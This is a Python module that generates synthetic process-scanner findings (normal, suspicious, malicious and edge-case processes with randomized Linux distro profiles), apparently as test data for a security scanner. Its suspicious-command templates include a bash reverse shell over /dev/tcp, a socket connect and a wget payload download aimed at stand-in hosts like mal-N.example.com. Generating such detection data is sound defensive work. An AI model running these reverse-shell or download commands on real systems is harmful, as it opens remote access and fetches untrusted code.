"""
Process scanner producer for generating synthetic process-related findings.
"""

from typing import Dict, List, Any
import random
import uuid
from .base_producer import AggregatingProducer

class ProcessProducer(AggregatingProducer):
    """Producer for synthetic process scanner findings."""

    def __init__(self):
        super().__init__("processes")
        self.common_processes = [
            "/usr/sbin/sshd", "/usr/bin/bash", "/usr/bin/python3", "/usr/sbin/apache2",
            "/usr/bin/dockerd", "/usr/sbin/mysqld", "/usr/bin/node", "/usr/bin/java",
            "/usr/bin/systemd", "/usr/sbin/cron", "/usr/bin/gnome-shell", "/usr/bin/firefox"
        ]
        self.suspicious_patterns = [
            "/tmp/malicious", "/var/tmp/backdoor", "/home/user/.hidden/malware",
            "/usr/local/bin/suspicious", "/opt/evil/process"
        ]
        # OS distro profiles to diversify host coverage across Debian/Fedora/Arch/Ubuntu
        self.distro_profiles = [
            {
                "name": "Debian",
                "versions": ["11", "12"],
                "pkg_manager": "apt",
                "init": "systemd",
                "variant": "stable",
                "weight": 0.26,
            },
            {
                "name": "Ubuntu",
                "versions": ["20.04", "22.04", "24.04"],
                "pkg_manager": "apt",
                "init": "systemd",
                "variant": "lts",
                "weight": 0.28,
            },
            {
                "name": "Fedora",
                "versions": ["38", "39", "40"],
                "pkg_manager": "dnf",
                "init": "systemd",
                "variant": "workstation",
                "weight": 0.24,
            },
            {
                "name": "Arch",
                "versions": ["rolling"],
                "pkg_manager": "pacman",
                "init": "systemd",
                "variant": "rolling",
                "weight": 0.14,
            },
            {
                "name": "Alpine",
                "versions": ["3.18", "3.19", "3.20"],
                "pkg_manager": "apk",
                "init": "openrc",
                "variant": "minimal",
                "weight": 0.08,
            },
        ]

    def generate_findings(self, count: int = 500) -> List[Dict[str, Any]]:
        """Generate synthetic process findings."""
        findings = []

        for i in range(count):
            scenario = self._choose_scenario()
            finding = self._generate_process_finding(scenario, i)
            findings.append(finding)

        return self.aggregate_findings(findings)

    def _generate_process_finding(self, scenario: str, index: int) -> Dict[str, Any]:
        """Generate a single process finding based on scenario."""

        if scenario == 'normal':
            return self._generate_normal_process(index)
        elif scenario == 'suspicious':
            return self._generate_suspicious_process(index)
        elif scenario == 'malicious':
            return self._generate_malicious_process(index)
        elif scenario == 'edge_case':
            return self._generate_edge_case_process(index)
        else:
            return self._generate_normal_process(index)

    def _generate_normal_process(self, index: int) -> Dict[str, Any]:
        """Generate a normal process finding."""
        process = random.choice(self.common_processes)
        pid = random.randint(1000, 9999)

        return self._generate_base_finding(
            finding_id=f"proc_{pid}_{index}",
            title=f"Running process: {process.split('/')[-1]}",
            severity="info",
            risk_score=10,
            base_severity_score=10,
            description=f"Normal system process {process} is running with PID {pid}",
            metadata={
                "pid": pid,
                "command": process,
                "user": "root" if random.random() < 0.3 else "user",
                "state": "S (sleeping)",
                "ppid": random.randint(1, 1000),
                **self._sample_host_profile(),
            }
        )

    def _generate_suspicious_process(self, index: int) -> Dict[str, Any]:
        """Generate a suspicious process finding."""
        from .augmentation_utils import random_username, unique_token, perturb_text

        suspicious_templates = [
            "/usr/bin/nc -l {port}", "/usr/bin/python3 -c 'import socket; s.connect(({host},{port}))'",
            "/bin/bash -i >& /dev/tcp/{host}/{port}", "/usr/bin/wget http://{host}/payload"
        ]
        host = f"mal-{random.randint(1,999)}.example.com"
        port = random.randint(1024, 65535)
        command = random.choice(suspicious_templates).format(host=host, port=port)
        pid = random.randint(10000, 20000)

        title = perturb_text("Suspicious process detected")

        return self._generate_base_finding(
            finding_id=f"proc_susp_{pid}_{index}_{unique_token()}",
            title=title,
            severity="medium",
            risk_score=50,
            base_severity_score=50,
            description=f"Process with suspicious command pattern: {command}",
            metadata={
                "pid": pid,
                "command": command,
                "user": random.choice([random_username(), "www-data", "nobody"]),
                "state": "R (running)",
                "ppid": random.randint(1, 1000),
                "pattern_match": True,
                **self._sample_host_profile(),
            }
        )

    def _generate_malicious_process(self, index: int) -> Dict[str, Any]:
        """Generate a malicious process finding."""
        from .augmentation_utils import unique_token, random_username, perturb_text

        malicious_templates = [
            "/tmp/.evil/{token} --daemon", "/var/tmp/backdoor -p {port}",
            "/home/{user}/.config/{token}", "/usr/local/bin/{token}"
        ]
        token = unique_token('mal')
        port = random.choice([1337, 4444, 5555, random.randint(2000,65000)])
        user = random.choice([random_username(), 'root'])
        command = random.choice(malicious_templates).format(token=token, port=port, user=user)
        pid = random.randint(20000, 30000)

        title = perturb_text("Malicious process detected")

        return self._generate_base_finding(
            finding_id=f"proc_mal_{pid}_{index}_{token}",
            title=title,
            severity="high",
            risk_score=80,
            base_severity_score=80,
            description=f"Process exhibiting malicious behavior: {command}",
            metadata={
                "pid": pid,
                "command": command,
                "user": user,
                "state": "R (running)",
                "ppid": 1,
                "deleted_executable": True,
                "world_writable_executable": True,
                **self._sample_host_profile(),
            }
        )

    def _generate_edge_case_process(self, index: int) -> Dict[str, Any]:
        """Generate an edge case process finding."""
        edge_cases = [
            {"cmd": "/proc/self/exe", "desc": "Process executing from /proc/self/exe"},
            {"cmd": "", "desc": "Process with empty command line"},
            {"cmd": "A" * 1000, "desc": "Process with extremely long command line"},
            {"cmd": "/dev/null", "desc": "Process executing /dev/null"}
        ]
        edge_case = random.choice(edge_cases)

        return self._generate_base_finding(
            finding_id=f"proc_edge_{index}",
            title="Edge case process",
            severity="low",
            risk_score=30,
            base_severity_score=30,
            description=edge_case["desc"],
            metadata={
                "pid": random.randint(1, 100),
                "command": edge_case["cmd"],
                "user": "kernel",
                "state": "Z (zombie)" if random.random() < 0.5 else "S (sleeping)",
                "ppid": 0,
                **self._sample_host_profile(),
            }
        )

    def _sample_host_profile(self) -> Dict[str, Any]:
        """Return a host distro profile to diversify across major Linux families."""
        weights = [p["weight"] for p in self.distro_profiles]
        profile = random.choices(self.distro_profiles, weights=weights, k=1)[0]
        version = random.choice(profile["versions"])
        kernel_minor = random.randint(1, 12)
        kernel_patch = random.randint(1, 30)
        selinux = profile["name"] in {"Fedora"}
        apparmor = profile["name"] in {"Ubuntu", "Debian"}

        return {
            "distro": profile["name"],
            "distro_variant": profile["variant"],
            "distro_version": version,
            "package_manager": profile["pkg_manager"],
            "init_system": profile["init"],
            "kernel_version": f"6.{kernel_minor}.{kernel_patch}-{profile['name'].lower()}",
            "selinux_enforcing": str(selinux).lower(),
            "apparmor": str(apparmor).lower(),
        }